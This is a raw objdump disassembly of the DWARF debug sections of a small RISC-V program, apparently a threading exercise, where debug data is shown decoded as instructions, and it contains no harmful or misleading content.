    10a8:	bf91                	.2byte	0xbf91
    10aa:	077f 01bc 8020 0000 	.byte	0x7f, 0x07, 0xbc, 0x01, 0x20, 0x80, 0x00, 0x00, 0x00, 0x00
    10b2:	0000 
    10b4:	0224                	.2byte	0x224
    10b6:	0000                	.2byte	0x0
    10b8:	0000                	.2byte	0x0
    10ba:	0000                	.2byte	0x0
    10bc:	6901                	.2byte	0x6901
    10be:	7864                	.2byte	0x7864
    10c0:	0200                	.2byte	0x200
    10c2:	00520e5b          	.4byte	0x520e5b
    10c6:	0000                	.2byte	0x0
    10c8:	9102                	.2byte	0x9102
    10ca:	076c                	.2byte	0x76c
    10cc:	01c8                	.2byte	0x1c8
    10ce:	8020                	.2byte	0x8020
    10d0:	0000                	.2byte	0x0
    10d2:	0000                	.2byte	0x0
    10d4:	0200                	.2byte	0x200
    10d6:	0000                	.2byte	0x0
    10d8:	0000                	.2byte	0x0
    10da:	0000                	.2byte	0x0
    10dc:	f902                	.2byte	0xf902
    10de:	02000003          	lb	zero,32(zero) # 20 <threadsense.5+0x20>
    10e2:	125d                	.2byte	0x125d
    10e4:	0285                	.2byte	0x285
    10e6:	0000                	.2byte	0x0
    10e8:	7ec09103          	lh	sp,2028(ra) # 1778 <threadsense.2+0x16f4>
    10ec:	7301                	.2byte	0x7301
    10ee:	6d75                	.2byte	0x6d75
    10f0:	0200                	.2byte	0x200
    10f2:	00520d6b          	.4byte	0x520d6b
    10f6:	0000                	.2byte	0x0
    10f8:	9102                	.2byte	0x9102
    10fa:	1960                	.2byte	0x1960
    10fc:	0214                	.2byte	0x214
    10fe:	8020                	.2byte	0x8020
    1100:	0000                	.2byte	0x0
    1102:	0000                	.2byte	0x0
    1104:	00b8                	.2byte	0xb8
    1106:	0000                	.2byte	0x0
    1108:	0000                	.2byte	0x0
    110a:	0000                	.2byte	0x0
    110c:	024e                	.2byte	0x24e
    110e:	0000                	.2byte	0x0
    1110:	7401                	.2byte	0x7401
    1112:	0200                	.2byte	0x200
    1114:	125e                	.2byte	0x125e
    1116:	0052                	.2byte	0x52
    1118:	0000                	.2byte	0x0
    111a:	9102                	.2byte	0x9102
    111c:	0768                	.2byte	0x768
    111e:	021c                	.2byte	0x21c
    1120:	8020                	.2byte	0x8020
    1122:	0000                	.2byte	0x0
    1124:	0000                	.2byte	0x0
    1126:	0030                	.2byte	0x30
    1128:	0000                	.2byte	0x0
    112a:	0000                	.2byte	0x0
    112c:	0000                	.2byte	0x0
    112e:	6901                	.2byte	0x6901
    1130:	0200                	.2byte	0x200
    1132:	1661                	.2byte	0x1661
    1134:	0052                	.2byte	0x52
    1136:	0000                	.2byte	0x0
    1138:	9102                	.2byte	0x9102
    113a:	0064                	.2byte	0x64
    113c:	0700                	.2byte	0x700
    113e:	02d0                	.2byte	0x2d0
    1140:	8020                	.2byte	0x8020
    1142:	0000                	.2byte	0x0
    1144:	0000                	.2byte	0x0
    1146:	004c                	.2byte	0x4c
    1148:	0000                	.2byte	0x0
    114a:	0000                	.2byte	0x0
    114c:	0000                	.2byte	0x0
    114e:	7401                	.2byte	0x7401
    1150:	0200                	.2byte	0x200
    1152:	126c                	.2byte	0x126c
    1154:	0052                	.2byte	0x52
    1156:	0000                	.2byte	0x0
    1158:	9102                	.2byte	0x9102
    115a:	005c                	.2byte	0x5c
    115c:	0000                	.2byte	0x0
    115e:	0a00                	.2byte	0xa00
    1160:	00ad                	.2byte	0xad
    1162:	0000                	.2byte	0x0
    1164:	0280                	.2byte	0x280
    1166:	0000                	.2byte	0x0
    1168:	820d                	.2byte	0x820d
    116a:	0000                	.2byte	0x0
    116c:	1f00                	.2byte	0x1f00
    116e:	0600                	.2byte	0x600
    1170:	00ad                	.2byte	0xad
    1172:	0000                	.2byte	0x0
    1174:	b90a                	.2byte	0xb90a
    1176:	0000                	.2byte	0x0
    1178:	9500                	.2byte	0x9500
    117a:	0002                	.2byte	0x2
    117c:	0d00                	.2byte	0xd00
    117e:	0082                	.2byte	0x82
    1180:	0000                	.2byte	0x0
    1182:	0004                	.2byte	0x4
    1184:	d60e                	.2byte	0xd60e
    1186:	42000003          	lb	zero,1056(zero) # 420 <threadsense.2+0x39c>
    118a:	b90a                	.2byte	0xb90a
    118c:	0000                	.2byte	0x0
    118e:	fc00                	.2byte	0xfc00
    1190:	2000                	.2byte	0x2000
    1192:	0080                	.2byte	0x80
    1194:	0000                	.2byte	0x0
    1196:	7000                	.2byte	0x7000
    1198:	0000                	.2byte	0x0
    119a:	0000                	.2byte	0x0
    119c:	0000                	.2byte	0x0
    119e:	0100                	.2byte	0x100
    11a0:	e29c                	.2byte	0xe29c
    11a2:	0002                	.2byte	0x2
    11a4:	0400                	.2byte	0x400
    11a6:	0069                	.2byte	0x69
    11a8:	4202                	.2byte	0x4202
    11aa:	b91a                	.2byte	0xb91a
    11ac:	0000                	.2byte	0x0
    11ae:	0200                	.2byte	0x200
    11b0:	5891                	.2byte	0x5891
    11b2:	6904                	.2byte	0x6904
    11b4:	7864                	.2byte	0x7864
    11b6:	0200                	.2byte	0x200
    11b8:	2642                	.2byte	0x2642
    11ba:	00b9                	.2byte	0xb9
    11bc:	0000                	.2byte	0x0
    11be:	9102                	.2byte	0x9102
    11c0:	0250                	.2byte	0x250
    11c2:	00000407          	.4byte	0x407
    11c6:	4302                	.2byte	0x4302
    11c8:	b90e                	.2byte	0xb90e
    11ca:	0000                	.2byte	0x0
    11cc:	0200                	.2byte	0x200
    11ce:	6891                	.2byte	0x6891
    11d0:	1a00                	.2byte	0x1a00
    11d2:	03ba                	.2byte	0x3ba
    11d4:	0000                	.2byte	0x0
    11d6:	3802                	.2byte	0x3802
    11d8:	d406                	.2byte	0xd406
    11da:	2000                	.2byte	0x2000
    11dc:	0080                	.2byte	0x80
    11de:	0000                	.2byte	0x0
    11e0:	2800                	.2byte	0x2800
    11e2:	0000                	.2byte	0x0
    11e4:	0000                	.2byte	0x0
    11e6:	0000                	.2byte	0x0
    11e8:	0100                	.2byte	0x100
    11ea:	1b9c                	.2byte	0x1b9c
    11ec:	0400                	.2byte	0x400
    11ee:	0000                	.2byte	0x0
    11f0:	1c02                	.2byte	0x1c02
    11f2:	1006                	.2byte	0x1006
    11f4:	2000                	.2byte	0x2000
    11f6:	0080                	.2byte	0x80
    11f8:	0000                	.2byte	0x0
    11fa:	c400                	.2byte	0xc400
    11fc:	0000                	.2byte	0x0
    11fe:	0000                	.2byte	0x0
    1200:	0000                	.2byte	0x0
    1202:	0100                	.2byte	0x100
    1204:	719c                	.2byte	0x719c
    1206:	05000003          	lb	zero,80(zero) # 50 <buf.4+0x10>
    120a:	03f1                	.2byte	0x3f1
    120c:	0000                	.2byte	0x0
    120e:	1c02                	.2byte	0x1c02
    1210:	b916                	.2byte	0xb916
    1212:	0000                	.2byte	0x0
    1214:	0200                	.2byte	0x200
    1216:	4891                	.2byte	0x4891
    1218:	6904                	.2byte	0x6904
    121a:	7864                	.2byte	0x7864
    121c:	0200                	.2byte	0x200
    121e:	281c                	.2byte	0x281c
    1220:	00b9                	.2byte	0xb9
    1222:	0000                	.2byte	0x0
    1224:	9102                	.2byte	0x9102
    1226:	0140                	.2byte	0x140
    1228:	1d020073          	.4byte	0x1d020073
    122c:	0000c517          	auipc	a0,0xc
    1230:	0200                	.2byte	0x200
    1232:	6891                	.2byte	0x6891
    1234:	b402                	.2byte	0xb402
    1236:	02000003          	lb	zero,32(zero) # 20 <threadsense.5+0x20>
    123a:	171e                	.2byte	0x171e
    123c:	00c5                	.2byte	0xc5
    123e:	0000                	.2byte	0x0
    1240:	9102                	.2byte	0x9102
    1242:	0160                	.2byte	0x160
    1244:	7774                	.2byte	0x7774
    1246:	1e02006f          	j	21426 <threadsense.2+0x213a2>
    124a:	0000c523          	.4byte	0xc523
    124e:	0200                	.2byte	0x200
    1250:	5891                	.2byte	0x5891
    1252:	7601                	.2byte	0x7601
    1254:	0200                	.2byte	0x200
    1256:	1720                	.2byte	0x1720
    1258:	00c5                	.2byte	0xc5
    125a:	0000                	.2byte	0x0
    125c:	9102                	.2byte	0x9102
    125e:	0050                	.2byte	0x50
    1260:	0002d30b          	.4byte	0x2d30b
    1264:	7800                	.2byte	0x7800
    1266:	b911                	.2byte	0xb911
    1268:	0000                	.2byte	0x0
    126a:	d800                	.2byte	0xd800
    126c:	002a                	.2byte	0x2a
    126e:	0080                	.2byte	0x80
    1270:	0000                	.2byte	0x0
    1272:	4c00                	.2byte	0x4c00
    1274:	0000                	.2byte	0x0
    1276:	0000                	.2byte	0x0
    1278:	0000                	.2byte	0x0
    127a:	0100                	.2byte	0x100
    127c:	af9c                	.2byte	0xaf9c
    127e:	04000003          	lb	zero,64(zero) # 40 <buf.4>
    1282:	0078                	.2byte	0x78
    1284:	7801                	.2byte	0x7801
    1286:	b921                	.2byte	0xb921
    1288:	0000                	.2byte	0x0
    128a:	0200                	.2byte	0x200
    128c:	5891                	.2byte	0x5891
    128e:	0502                	.2byte	0x502
    1290:	0002                	.2byte	0x2
    1292:	0100                	.2byte	0x100
    1294:	0c7a                	.2byte	0xc7a
    1296:	00b9                	.2byte	0xb9
    1298:	0000                	.2byte	0x0
    129a:	9102                	.2byte	0x9102
    129c:	0068                	.2byte	0x68
    129e:	0003540b          	.4byte	0x3540b
    12a2:	7200                	.2byte	0x7200
    12a4:	b911                	.2byte	0xb911
    12a6:	0000                	.2byte	0x0
    12a8:	8c00                	.2byte	0x8c00
    12aa:	002a                	.2byte	0x2a
    12ac:	0080                	.2byte	0x80
    12ae:	0000                	.2byte	0x0
    12b0:	4c00                	.2byte	0x4c00
    12b2:	0000                	.2byte	0x0
    12b4:	0000                	.2byte	0x0
    12b6:	0000                	.2byte	0x0
    12b8:	0100                	.2byte	0x100
    12ba:	ed9c                	.2byte	0xed9c
    12bc:	04000003          	lb	zero,64(zero) # 40 <buf.4>
    12c0:	0078                	.2byte	0x78
    12c2:	7201                	.2byte	0x7201
    12c4:	b91f 0000 0200      	.byte	0x1f, 0xb9, 0x00, 0x00, 0x00, 0x02
    12ca:	5891                	.2byte	0x5891
    12cc:	6201                	.2byte	0x6201
    12ce:	7469                	.2byte	0x7469
    12d0:	0100                	.2byte	0x100
    12d2:	0c74                	.2byte	0xc74
    12d4:	00b9                	.2byte	0xb9
    12d6:	0000                	.2byte	0x0
    12d8:	9102                	.2byte	0x9102
    12da:	0068                	.2byte	0x68
    12dc:	0001dc0f          	.4byte	0x1dc0f
    12e0:	5e00                	.2byte	0x5e00
    12e2:	0029e427          	.4byte	0x29e427
    12e6:	0080                	.2byte	0x80
    12e8:	0000                	.2byte	0x0
    12ea:	a800                	.2byte	0xa800
    12ec:	0000                	.2byte	0x0
    12ee:	0000                	.2byte	0x0
    12f0:	0000                	.2byte	0x0
    12f2:	0100                	.2byte	0x100
    12f4:	529c                	.2byte	0x529c
    12f6:	0004                	.2byte	0x4
    12f8:	0500                	.2byte	0x500
    12fa:	02f8                	.2byte	0x2f8
    12fc:	0000                	.2byte	0x0
    12fe:	5e01                	.2byte	0x5e01
    1300:	00005233          	srl	tp,zero,zero
    1304:	0200                	.2byte	0x200
    1306:	6c91                	.2byte	0x6c91
    1308:	2d02                	.2byte	0x2d02
    130a:	01000003          	lb	zero,16(zero) # 10 <threadsense.5+0x10>
    130e:	1760                	.2byte	0x1760
    1310:	0059                	.2byte	0x59
    1312:	0000                	.2byte	0x0
    1314:	0309                	.2byte	0x309
    1316:	6004                	.2byte	0x6004
    1318:	8000                	.2byte	0x8000
    131a:	0000                	.2byte	0x0
    131c:	0000                	.2byte	0x0
    131e:	0902                	.2byte	0x902
    1320:	01000003          	lb	zero,16(zero) # 10 <threadsense.5+0x10>
    1324:	1761                	.2byte	0x1761
    1326:	0059                	.2byte	0x59
    1328:	0000                	.2byte	0x0
    132a:	0309                	.2byte	0x309
    132c:	6000                	.2byte	0x6000
    132e:	8000                	.2byte	0x8000
    1330:	0000                	.2byte	0x0
    1332:	0000                	.2byte	0x0
    1334:	271c                	.2byte	0x271c
    1336:	01000003          	lb	zero,16(zero) # 10 <threadsense.5+0x10>
    133a:	1762                	.2byte	0x1762
    133c:	0052                	.2byte	0x52
    133e:	0000                	.2byte	0x0
    1340:	0b00                	.2byte	0xb00
    1342:	0251                	.2byte	0x251
    1344:	0000                	.2byte	0x0
    1346:	0c4e                	.2byte	0xc4e
    1348:	0052                	.2byte	0x52
    134a:	0000                	.2byte	0x0
    134c:	285c                	.2byte	0x285c
    134e:	8000                	.2byte	0x8000
    1350:	0000                	.2byte	0x0
    1352:	0000                	.2byte	0x0
    1354:	0188                	.2byte	0x188
    1356:	0000                	.2byte	0x0
    1358:	0000                	.2byte	0x0
    135a:	0000                	.2byte	0x0
    135c:	9c01                	.2byte	0x9c01
    135e:	00000517          	auipc	a0,0x0
    1362:	6e04                	.2byte	0x6e04
    1364:	0100                	.2byte	0x100
    1366:	1d4e                	.2byte	0x1d4e
    1368:	0052                	.2byte	0x52
    136a:	0000                	.2byte	0x0
    136c:	7fbc9103          	lh	sp,2043(s9)
    1370:	8405                	.2byte	0x8405
    1372:	0002                	.2byte	0x2
    1374:	0100                	.2byte	0x100
    1376:	374e                	.2byte	0x374e
    1378:	00000517          	auipc	a0,0x0
    137c:	7fb09103          	lh	sp,2043(ra)
    1380:	5905                	.2byte	0x5905
    1382:	0001                	.2byte	0x1
    1384:	0100                	.2byte	0x100
    1386:	4b4e                	.2byte	0x4b4e
    1388:	052d                	.2byte	0x52d
    138a:	0000                	.2byte	0x0
    138c:	7fa89103          	lh	sp,2042(a7)
    1390:	6901                	.2byte	0x6901
    1392:	0100                	.2byte	0x100
    1394:	0750                	.2byte	0x750
    1396:	0052                	.2byte	0x52
    1398:	0000                	.2byte	0x0
    139a:	9102                	.2byte	0x9102
    139c:	076c                	.2byte	0x76c
    139e:	2880                	.2byte	0x2880
    13a0:	8000                	.2byte	0x8000
    13a2:	0000                	.2byte	0x0
    13a4:	0000                	.2byte	0x0
    13a6:	00cc                	.2byte	0xcc
    13a8:	0000                	.2byte	0x0
    13aa:	0000                	.2byte	0x0
    13ac:	0000                	.2byte	0x0
    13ae:	7401                	.2byte	0x7401
    13b0:	0030                	.2byte	0x30
    13b2:	5401                	.2byte	0x5401
    13b4:	1c0c                	.2byte	0x1c0c
    13b6:	0005                	.2byte	0x5
    13b8:	0200                	.2byte	0x200
    13ba:	6091                	.2byte	0x6091
    13bc:	7401                	.2byte	0x7401
    13be:	0031                	.2byte	0x31
    13c0:	5401                	.2byte	0x5401
    13c2:	1c1a                	.2byte	0x1c1a
    13c4:	0005                	.2byte	0x5
    13c6:	0200                	.2byte	0x200
    13c8:	5891                	.2byte	0x5891
    13ca:	7601                	.2byte	0x7601
    13cc:	0030                	.2byte	0x30
    13ce:	5501                	.2byte	0x5501
    13d0:	1c0c                	.2byte	0x1c0c
    13d2:	0005                	.2byte	0x5
    13d4:	0200                	.2byte	0x200
    13d6:	5091                	.2byte	0x5091
    13d8:	7601                	.2byte	0x7601
    13da:	0031                	.2byte	0x31
    13dc:	5501                	.2byte	0x5501
    13de:	1c1c                	.2byte	0x1c1c
    13e0:	0005                	.2byte	0x5
    13e2:	0200                	.2byte	0x200
    13e4:	4891                	.2byte	0x4891
    13e6:	6501                	.2byte	0x6501
    13e8:	3171                	.2byte	0x3171
    13ea:	0100                	.2byte	0x100
    13ec:	0956                	.2byte	0x956
    13ee:	0052                	.2byte	0x52
    13f0:	0000                	.2byte	0x0
    13f2:	9102                	.2byte	0x9102
    13f4:	0144                	.2byte	0x144
    13f6:	7165                	.2byte	0x7165
    13f8:	0032                	.2byte	0x32
    13fa:	5601                	.2byte	0x5601
    13fc:	5219                	.2byte	0x5219
    13fe:	0000                	.2byte	0x0
    1400:	0200                	.2byte	0x200
    1402:	4091                	.2byte	0x4091
    1404:	0000                	.2byte	0x0
    1406:	2806                	.2byte	0x2806
    1408:	0005                	.2byte	0x5
    140a:	0300                	.2byte	0x300
    140c:	0408                	.2byte	0x408
    140e:	0346                	.2byte	0x346
    1410:	0000                	.2byte	0x0
    1412:	1c09                	.2byte	0x1c09
    1414:	0005                	.2byte	0x5
    1416:	0c00                	.2byte	0xc00
    1418:	00000523          	sb	zero,10(zero) # a <threadsense.5+0xa>
    141c:	2306                	.2byte	0x2306
    141e:	0005                	.2byte	0x5
    1420:	0b00                	.2byte	0xb00
    1422:	0159                	.2byte	0x159
    1424:	0000                	.2byte	0x0
    1426:	0c3e                	.2byte	0xc3e
    1428:	0052                	.2byte	0x52
    142a:	0000                	.2byte	0x0
    142c:	26e4                	.2byte	0x26e4
    142e:	8000                	.2byte	0x8000
    1430:	0000                	.2byte	0x0
    1432:	0000                	.2byte	0x0
    1434:	0178                	.2byte	0x178
    1436:	0000                	.2byte	0x0
    1438:	0000                	.2byte	0x0
    143a:	0000                	.2byte	0x0
    143c:	9c01                	.2byte	0x9c01
    143e:	000005d7          	.4byte	0x5d7
    1442:	6e04                	.2byte	0x6e04
    1444:	0100                	.2byte	0x100
    1446:	173e                	.2byte	0x173e
    1448:	0052                	.2byte	0x52
    144a:	0000                	.2byte	0x0
    144c:	9102                	.2byte	0x9102
    144e:	054c                	.2byte	0x54c
    1450:	0284                	.2byte	0x284
    1452:	0000                	.2byte	0x0
    1454:	3e01                	.2byte	0x3e01
    1456:	d72e                	.2byte	0xd72e
    1458:	0005                	.2byte	0x5
    145a:	0200                	.2byte	0x200
    145c:	4091                	.2byte	0x4091
    145e:	5905                	.2byte	0x5905
    1460:	0001                	.2byte	0x1
    1462:	0100                	.2byte	0x100
    1464:	3f3e                	.2byte	0x3f3e
    1466:	05dc                	.2byte	0x5dc
    1468:	0000                	.2byte	0x0
    146a:	7fb89103          	lh	sp,2043(a7)
    146e:	6901                	.2byte	0x6901
    1470:	0100                	.2byte	0x100
    1472:	0740                	.2byte	0x740
    1474:	0052                	.2byte	0x52
    1476:	0000                	.2byte	0x0
    1478:	9102                	.2byte	0x9102
    147a:	076c                	.2byte	0x76c
    147c:	2708                	.2byte	0x2708
    147e:	8000                	.2byte	0x8000
    1480:	0000                	.2byte	0x0
    1482:	0000                	.2byte	0x0
    1484:	00b8                	.2byte	0xb8
    1486:	0000                	.2byte	0x0
    1488:	0000                	.2byte	0x0
    148a:	0000                	.2byte	0x0
    148c:	7401                	.2byte	0x7401
    148e:	0030                	.2byte	0x30
    1490:	4401                	.2byte	0x4401
    1492:	5209                	.2byte	0x5209
    1494:	0000                	.2byte	0x0
    1496:	0200                	.2byte	0x200
    1498:	6891                	.2byte	0x6891
    149a:	7401                	.2byte	0x7401
    149c:	0031                	.2byte	0x31
    149e:	4401                	.2byte	0x4401
    14a0:	00005217          	auipc	tp,0x5
    14a4:	0200                	.2byte	0x200
    14a6:	6491                	.2byte	0x6491
    14a8:	7601                	.2byte	0x7601
    14aa:	0030                	.2byte	0x30
    14ac:	4501                	.2byte	0x4501
    14ae:	5209                	.2byte	0x5209
    14b0:	0000                	.2byte	0x0
    14b2:	0200                	.2byte	0x200
    14b4:	6091                	.2byte	0x6091
    14b6:	7601                	.2byte	0x7601
    14b8:	0031                	.2byte	0x31
    14ba:	4501                	.2byte	0x4501
    14bc:	5219                	.2byte	0x5219
    14be:	0000                	.2byte	0x0
    14c0:	0200                	.2byte	0x200
    14c2:	5c91                	.2byte	0x5c91
    14c4:	0000                	.2byte	0x0
    14c6:	5e06                	.2byte	0x5e06
    14c8:	0000                	.2byte	0x0
    14ca:	0600                	.2byte	0x600
    14cc:	00000063          	beqz	zero,14cc <threadsense.2+0x1448>
    14d0:	0001b00f          	.4byte	0x1b00f
    14d4:	3300                	.2byte	0x3300
    14d6:	b80d                	.2byte	0xb80d
    14d8:	0026                	.2byte	0x26
    14da:	0080                	.2byte	0x80
    14dc:	0000                	.2byte	0x0
    14de:	2c00                	.2byte	0x2c00
    14e0:	0000                	.2byte	0x0
    14e2:	0000                	.2byte	0x0
    14e4:	0000                	.2byte	0x0
    14e6:	0100                	.2byte	0x100
    14e8:	2a9c                	.2byte	0x2a9c
    14ea:	0006                	.2byte	0x6
    14ec:	0500                	.2byte	0x500
    14ee:	0239                	.2byte	0x239
    14f0:	0000                	.2byte	0x0
    14f2:	3301                	.2byte	0x3301
    14f4:	9c29                	.2byte	0x9c29
    14f6:	0000                	.2byte	0x0
    14f8:	0200                	.2byte	0x200
    14fa:	6891                	.2byte	0x6891
    14fc:	6e04                	.2byte	0x6e04
    14fe:	0100                	.2byte	0x100
    1500:	00523533          	sltu	a0,tp,t0
    1504:	0000                	.2byte	0x0
    1506:	9102                	.2byte	0x9102
    1508:	0464                	.2byte	0x464
    150a:	7261                	.2byte	0x7261
    150c:	0072                	.2byte	0x72
    150e:	3301                	.2byte	0x3301
    1510:	2d45                	.2byte	0x2d45
    1512:	0005                	.2byte	0x5
    1514:	0200                	.2byte	0x200
    1516:	5891                	.2byte	0x5891
    1518:	1d00                	.2byte	0x1d00
    151a:	01d1                	.2byte	0x1d1
    151c:	0000                	.2byte	0x0
    151e:	2801                	.2byte	0x2801
    1520:	8c0d                	.2byte	0x8c0d
    1522:	0026                	.2byte	0x26
    1524:	0080                	.2byte	0x80
    1526:	0000                	.2byte	0x0
    1528:	2c00                	.2byte	0x2c00
    152a:	0000                	.2byte	0x0
    152c:	0000                	.2byte	0x0
    152e:	0000                	.2byte	0x0
    1530:	0100                	.2byte	0x100
    1532:	059c                	.2byte	0x59c
    1534:	0239                	.2byte	0x239
    1536:	0000                	.2byte	0x0
    1538:	2801                	.2byte	0x2801
    153a:	00009c23          	sh	zero,24(ra)
    153e:	0200                	.2byte	0x200
    1540:	6891                	.2byte	0x6891
    1542:	6e04                	.2byte	0x6e04
    1544:	0100                	.2byte	0x100
    1546:	2f28                	.2byte	0x2f28
    1548:	0052                	.2byte	0x52
    154a:	0000                	.2byte	0x0
    154c:	9102                	.2byte	0x9102
    154e:	0464                	.2byte	0x464
    1550:	7261                	.2byte	0x7261
    1552:	0072                	.2byte	0x72
    1554:	2801                	.2byte	0x2801
    1556:	dc3c                	.2byte	0xdc3c
    1558:	0005                	.2byte	0x5
    155a:	0200                	.2byte	0x200
    155c:	5891                	.2byte	0x5891
	...

Disassembly of section .debug_abbrev:

0000000000000000 <.debug_abbrev>:
   0:	1101                	.2byte	0x1101
   2:	1000                	.2byte	0x1000
   4:	03175517          	auipc	a0,0x3175
   8:	1b0e                	.2byte	0x1b0e
   a:	250e                	.2byte	0x250e
   c:	130e                	.2byte	0x130e
   e:	0005                	.2byte	0x5
  10:	0000                	.2byte	0x0
  12:	2401                	.2byte	0x2401
  14:	0b00                	.2byte	0xb00
  16:	030b3e0b          	.4byte	0x30b3e0b
  1a:	000e                	.2byte	0xe
  1c:	0200                	.2byte	0x200
  1e:	0016                	.2byte	0x16
  20:	0b3a0e03          	lb	t3,179(s4) # 4d07 <threadsense.2+0x4c83>
  24:	0b390b3b          	.4byte	0xb390b3b
  28:	1349                	.2byte	0x1349
  2a:	0000                	.2byte	0x0
  2c:	03003403          	ld	s0,48(zero) # 30 <threadsense.5+0x30>
  30:	3a0e                	.2byte	0x3a0e
  32:	0121                	.2byte	0x121
  34:	21390b3b          	.4byte	0x21390b3b
  38:	0213490f          	.4byte	0x213490f
  3c:	0018                	.2byte	0x18
  3e:	0400                	.2byte	0x400
  40:	0111                	.2byte	0x111
  42:	0e25                	.2byte	0xe25
  44:	1f030b13          	add	s6,t1,496
  48:	01111f1b          	sllw	t5,sp,0x11
  4c:	0712                	.2byte	0x712
  4e:	1710                	.2byte	0x1710
  50:	0000                	.2byte	0x0
  52:	2405                	.2byte	0x2405
  54:	0b00                	.2byte	0xb00
  56:	030b3e0b          	.4byte	0x30b3e0b
  5a:	0008                	.2byte	0x8
  5c:	0600                	.2byte	0x600
  5e:	012e                	.2byte	0x12e
  60:	0e03193f 0b3b0b3a 	.8byte	0xb3b0b3a0e03193f
  68:	0b39                	.2byte	0xb39
  6a:	0111                	.2byte	0x111
  6c:	0712                	.2byte	0x712
  6e:	1840                	.2byte	0x1840
  70:	197a                	.2byte	0x197a
  72:	0000                	.2byte	0x0
  74:	0100                	.2byte	0x100
  76:	0005                	.2byte	0x5
  78:	0b3a0e03          	lb	t3,179(s4)
  7c:	0b390b3b          	.4byte	0xb390b3b
  80:	1349                	.2byte	0x1349
  82:	1802                	.2byte	0x1802
  84:	0000                	.2byte	0x0
  86:	3402                	.2byte	0x3402
  88:	0300                	.2byte	0x300
  8a:	3a08                	.2byte	0x3a08
  8c:	390b3b0b          	.4byte	0x390b3b0b
  90:	0213490b          	.4byte	0x213490b
  94:	0018                	.2byte	0x18
  96:	0300                	.2byte	0x300
  98:	0005                	.2byte	0x5
  9a:	0b3a0803          	lb	a6,179(s4)
  9e:	0b390b3b          	.4byte	0xb390b3b
  a2:	1349                	.2byte	0x1349
  a4:	1802                	.2byte	0x1802
  a6:	0000                	.2byte	0x0
  a8:	0504                	.2byte	0x504
  aa:	0300                	.2byte	0x300
  ac:	3a08                	.2byte	0x3a08
  ae:	0221                	.2byte	0x221
  b0:	0b39053b          	.4byte	0xb39053b
  b4:	1349                	.2byte	0x1349
  b6:	1802                	.2byte	0x1802
  b8:	0000                	.2byte	0x0
  ba:	3405                	.2byte	0x3405
  bc:	0300                	.2byte	0x300
  be:	3a08                	.2byte	0x3a08
  c0:	0221                	.2byte	0x221
  c2:	0b39053b          	.4byte	0xb39053b
  c6:	1349                	.2byte	0x1349
  c8:	1802                	.2byte	0x1802
  ca:	0000                	.2byte	0x0
  cc:	0f06                	.2byte	0xf06
  ce:	0b00                	.2byte	0xb00
  d0:	0821                	.2byte	0x821
  d2:	1349                	.2byte	0x1349
  d4:	0000                	.2byte	0x0
  d6:	0b002407          	flw	fs0,176(zero) # b0 <threadsense.2+0x2c>
  da:	030b3e0b          	.4byte	0x30b3e0b
  de:	000e                	.2byte	0xe
  e0:	0800                	.2byte	0x800
  e2:	0034                	.2byte	0x34
  e4:	0b3a0e03          	lb	t3,179(s4)
  e8:	0b390b3b          	.4byte	0xb390b3b
  ec:	1349                	.2byte	0x1349
  ee:	1802                	.2byte	0x1802
  f0:	0000                	.2byte	0x0
  f2:	1609                	.2byte	0x1609
  f4:	0300                	.2byte	0x300
  f6:	3a0e                	.2byte	0x3a0e
  f8:	390b3b0b          	.4byte	0x390b3b0b
  fc:	0013490b          	.4byte	0x13490b
 100:	0a00                	.2byte	0xa00
 102:	012e                	.2byte	0x12e
 104:	0b3a0e03          	lb	t3,179(s4)
 108:	0b390b3b          	.4byte	0xb390b3b
 10c:	13491927          	.4byte	0x13491927
 110:	0111                	.2byte	0x111
 112:	0712                	.2byte	0x712
 114:	1840                	.2byte	0x1840
 116:	197a                	.2byte	0x197a
 118:	1301                	.2byte	0x1301
 11a:	0000                	.2byte	0x0
 11c:	3f012e0b          	.4byte	0x3f012e0b
 120:	0319                	.2byte	0x319
 122:	3a0e                	.2byte	0x3a0e
 124:	0821                	.2byte	0x821
 126:	0b390b3b          	.4byte	0xb390b3b
 12a:	13491927          	.4byte	0x13491927
 12e:	0111                	.2byte	0x111
 130:	0712                	.2byte	0x712
 132:	1840                	.2byte	0x1840
 134:	197a                	.2byte	0x197a
 136:	1301                	.2byte	0x1301
 138:	0000                	.2byte	0x0
 13a:	260c                	.2byte	0x260c
 13c:	4900                	.2byte	0x4900
 13e:	0d000013          	li	zero,208
 142:	0005                	.2byte	0x5
 144:	213a0e03          	lb	t3,531(s4)
 148:	3b02                	.2byte	0x3b02
 14a:	3905                	.2byte	0x3905
 14c:	0213490b          	.4byte	0x213490b
 150:	0018                	.2byte	0x18
 152:	0e00                	.2byte	0xe00
 154:	0035                	.2byte	0x35
 156:	1349                	.2byte	0x1349
 158:	0000                	.2byte	0x0
 15a:	0300340f          	.4byte	0x300340f
 15e:	3a0e                	.2byte	0x3a0e
 160:	0221                	.2byte	0x221
 162:	0b39053b          	.4byte	0xb39053b
 166:	1349                	.2byte	0x1349
 168:	1802                	.2byte	0x1802
 16a:	0000                	.2byte	0x0
 16c:	0b10                	.2byte	0xb10
 16e:	1101                	.2byte	0x1101
 170:	1201                	.2byte	0x1201
 172:	11000007          	.4byte	0x11000007
 176:	012e                	.2byte	0x12e
 178:	0e03193f 0b3b0b3a 	.8byte	0xb3b0b3a0e03193f
 180:	0b39                	.2byte	0xb39
 182:	13491927          	.4byte	0x13491927
 186:	0111                	.2byte	0x111
 188:	0712                	.2byte	0x712
 18a:	1840                	.2byte	0x1840
 18c:	197c                	.2byte	0x197c
 18e:	1301                	.2byte	0x1301
 190:	0000                	.2byte	0x0
 192:	0112                	.2byte	0x112
 194:	4901                	.2byte	0x4901
 196:	00130113          	add	sp,t1,1
 19a:	1300                	.2byte	0x1300
 19c:	0021                	.2byte	0x21
 19e:	1349                	.2byte	0x1349
 1a0:	00000b2f          	.4byte	0xb2f
 1a4:	3414                	.2byte	0x3414
 1a6:	0300                	.2byte	0x300
 1a8:	3a0e                	.2byte	0x3a0e
 1aa:	0221                	.2byte	0x221
 1ac:	21390b3b          	.4byte	0x21390b3b
 1b0:	491a                	.2byte	0x491a
 1b2:	3c193f13          	sltiu	t5,s2,961
 1b6:	0019                	.2byte	0x19
 1b8:	1500                	.2byte	0x1500
 1ba:	0111010b          	.4byte	0x111010b
 1be:	0712                	.2byte	0x712
 1c0:	1301                	.2byte	0x1301
 1c2:	0000                	.2byte	0x0
 1c4:	1816                	.2byte	0x1816
 1c6:	0000                	.2byte	0x0
 1c8:	1700                	.2byte	0x1700
 1ca:	012e                	.2byte	0x12e
 1cc:	213a0e03          	lb	t3,531(s4)
 1d0:	3b02                	.2byte	0x3b02
 1d2:	270b390b          	.4byte	0x270b390b
 1d6:	1119                	.2byte	0x1119
